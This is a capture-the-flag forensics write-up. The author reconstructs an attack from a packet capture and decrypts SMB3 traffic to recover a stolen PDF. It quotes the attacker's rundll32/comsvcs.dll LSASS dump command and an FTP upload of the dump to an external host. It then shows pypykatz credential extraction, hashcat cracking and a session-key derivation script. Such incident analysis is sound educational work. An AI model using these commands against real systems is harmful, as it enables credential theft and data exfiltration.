# WRITE_UP #

## ROGUE ##

### 1. Analysis ###
* **Given:** a pcapng file named `capture.pcapng`
* **Description:** SecCorp has reached us about a recent cyber security incident. They are confident that a malicious entity has managed to access a shared folder that stores confidential files. Our threat intel informed us about an active dark web forum where disgruntled employees offer to give access to their employer's internal network for a financial reward. In this forum, one of SecCorp's employees offers to provide access to a low-privileged domain-joined user for 10K in cryptocurrency. Your task is to find out how they managed to gain access to the folder and what corporate secrets did they steal.
* **Hints:**   
    * No hints are given

### 2. Investigation ###
With the pcapng file, used `Protocol Hierarchy` I acknowledged that most of packets captures are transmitted via TCP, so I entirely focused on this protocol.

In tcp stream 0, I found PowerShell history of the machine:

![](pic1.png)

This PowerShell history shows the attacker had an interactive shell on WS02 as the local user `ws02\rpaker`. The attacker first confirmed the current user and hostname:

```ps1
whoami  -> ws02\rpaker
hostname -> ws02
```

They then checked the local `Administrators` group and confirmed that `rpaker` had local administrator privileges. This allowed them to access and dump the `lsass.exe` process.

The key command uses `rundll32.exe` with `comsvcs.dll` to create a full `LSASS` minidump:

```ps1
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\windows\temp\3858793632.pmd full
```

* **LSASS:** stands for Local Security Authority Subsystem Service. It is a critical Windows process responsible for enforcing local security policy, handling user logons, validating credentials, and managing authentication-related secrets such as: 
  * NTLM hashes
  * Kerberos tickets
  * DPAPI master keys
  * Cached logon credentials

The dump was saved as: `C:\windows\temp\3858793632.pmd`. It was then compressed into: `C:\windows\temp\3858793632.zip`. After that, the attacker uploaded the archive to an external FTP server:
`ftp://ftpuser:SZC0aBomFG@windowsliveupdater.com/3858793632.zip`

Finally, the attacker deleted both the dump and the zip file from `C:\Windows\Temp` to remove local artifacts.

In tcp stream 4, we can see the FTP control channel showing the attacker uploading the zipped LSASS dump to an external FTP server:

![](pic2.png)

In the next stream is the lsass dump, so I extracted the zip file to investigate it further. Unzipping the file gave me `3858793632.pmd`

To analyze the lsass dump, linux provides a strong tool named `pypykatz`, this tool can extract credentials in lsass dump:

```bash
python3 -m pypykatz lsa minidump 3858793632.pmd
```

![](pic3.png)

After filtering, these are some interesting credentials:
```bash
CORP\rpaker
NTLM: a9fdfa038c4b75ebc76dc855dd74f0da
SHA1: 9400ae28448e1364174dde269b2cce1bca9d7ee8

CORP\athomson
NTLM: 88d84bad705f61fcdea0d771301c3a7d
SHA1: 60570041018a9e38fbee99a3e1f7bc18712018ba

CORP\WS02$
NTLM: d22d6b1d22e752ede3fcc8a4f19f0996
```

With the NTLM hash, I hoped to find the flag using hashcat to crack these users' passwords. **Note:** You need to have a wordlist first to crack the hash. I personally used `rockyou.txt`, which can be downloaded [here](https://github.com/brannondorsey/naive-hashcat/releases). I saved the two NTLM hashes of `rpaker` and `athomson` to `hashes.txt` then ran:

```bash
hashcat -m 1000 hashes.txt ~/wordlists/rockyou.txt
```

![](pic4.png)

However I was only able to crack the password of `rpaker`, which gave me nothing new:

```text
rpaker:password123
```

I was stuck here for a bit, then decided to return to the pcapng to find more clues.

After some minutes looking for new clue, I saw a suspicious protocol `SMB2`, which transmitted several encrypted `SMB3` packets:

* **SMB2:** `Server Message Block version 2` is a Windows file sharing protocol used for accessing files, directories, printers, named pipes, and other network resources over the network.

![](pic5.png)

After doing some research, I found this article containing a detailed walkthrough of how to decrypt SMB3 traffic: [Decrypting SMB3 Traffic with just a PCAP? Absolutely (maybe.)](https://medium.com/maverislabs/decrypting-smb3-traffic-with-just-a-pcap-absolutely-maybe-712ed23ff6a2)

The reason this works comes from Microsoft's protocol specifications. In [MS-NLMP 3.3.2 NTLM v2 Authentication](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3), Microsoft defines the NTLMv2 key derivation process. The important parts are:

```text
ResponseKeyNT = NTOWFv2(password, user, domain)
NTProofStr = HMAC_MD5(ResponseKeyNT, ServerChallenge || temp)
SessionBaseKey = HMAC_MD5(ResponseKeyNT, NTProofStr)
```

In the pcap, the NTLMSSP authentication exchange exposes the `NTProofStr` and the encrypted session key. Since I already recovered `athomson`'s NTLM hash from the LSASS dump, I could reproduce the NTLMv2 key derivation and decrypt the encrypted session key to recover the real Random Session Key.

Microsoft's [MS-SMB2 1.7 Versioning and Capability Negotiation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/fac3655a-7eb5-4337-b0ab-244bbcd014e8) explains that SMB 3.x supports authenticated encryption using AES. Microsoft also defines the per-session SMB2/SMB3 state in [MS-SMB2 3.2.1.3 Per Session](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/8174c219-2224-4009-b96a-06d84eccb3ae), including `Session.SessionId`, `Session.SessionKey`, `Session.EncryptionKey`, and `Session.DecryptionKey`. This is why Wireshark/tshark can decrypt SMB3 traffic when we provide the correct SMB Session ID and session key.

To sum up, we can decrypt the SMB3 packets using these ingredients:
* Username
* Workgroup
* NTLM hash/Password
* NTProofStr
* Encrypted session key
* SMB Session ID

With the `Username` and `Workgroup`, I identified they are `athomson` and `CORP`:

![](pic6.png)

I also found `NTProofStr` and the encrypted session key in the pcapng file:

![](pic7.png)

The values used for the calculation were:

```text
Username: athomson
Domain: CORP
NTLM hash: 88d84bad705f61fcdea0d771301c3a7d
NTProofStr: d047ccdffaeafb22f222e15e719a34d4
Encrypted Session Key: 032c9ca4f6908be613b240062936e2d2
SMB Session ID: 1500000000a00000
```

To calculate the Random Session Key, I used the following Python script:

```python
import hashlib
import hmac
import argparse

try:
    from Cryptodome.Cipher import ARC4
except Exception:
    print("Warning: You need pycryptodomex")

def decrypt_encrypted_session_key(key_exchange_key, encrypted_session_key):
    cipher = ARC4.new(key_exchange_key)
    return cipher.decrypt(encrypted_session_key)

parser = argparse.ArgumentParser(description="Calculate the SMB Random Session Key from NTLMSSP data.")
parser.add_argument("-u", "--user", required=True)
parser.add_argument("-d", "--domain", required=True)
parser.add_argument("-n", "--ntlmhash", required=True)
parser.add_argument("-p", "--ntproofstr", required=True)
parser.add_argument("-k", "--key", required=True)
args = parser.parse_args()

user = args.user.upper().encode("utf-16le")
domain = args.domain.upper().encode("utf-16le")
ntlm_hash = bytes.fromhex(args.ntlmhash)
ntproofstr = bytes.fromhex(args.ntproofstr)
encrypted_session_key = bytes.fromhex(args.key)

response_nt_key = hmac.new(ntlm_hash, user + domain, hashlib.md5).digest()
key_exchange_key = hmac.new(response_nt_key, ntproofstr, hashlib.md5).digest()
random_session_key = decrypt_encrypted_session_key(key_exchange_key, encrypted_session_key)

print(random_session_key.hex())
```

I ran it with:

```bash
python3 SMB_decrypt.py -u athomson -d CORP -n 88d84bad705f61fcdea0d771301c3a7d -p d047ccdffaeafb22f222e15e719a34d4 -k 032c9ca4f6908be613b240062936e2d2 
```

![](pic8.png)

The script returned the random session key: 9ae0af5c19ba0de2ddbe70881d4263ac

With the SMB Session ID and the recovered Random Session Key, I used `tshark` to decrypt the SMB traffic and export the transferred files:

```bash
mkdir files
tshark -r capture.pcapng \
  "-ouat:smb2_seskey_list:1500000000a00000,9ae0af5c19ba0de2ddbe70881d4263ac,"'"",""' \
  --export-objects smb,files
```

This exported the file:

```text
%5ccustomer_information.pdf
```

Opening the PDF revealed the flag on page 3:

![](pic9.png)

### 3. Solution ###
1. **Result:** The flag is `HTB{n0th1ng_c4n_st4y_un3ncrypt3d_f0r3v3r}`
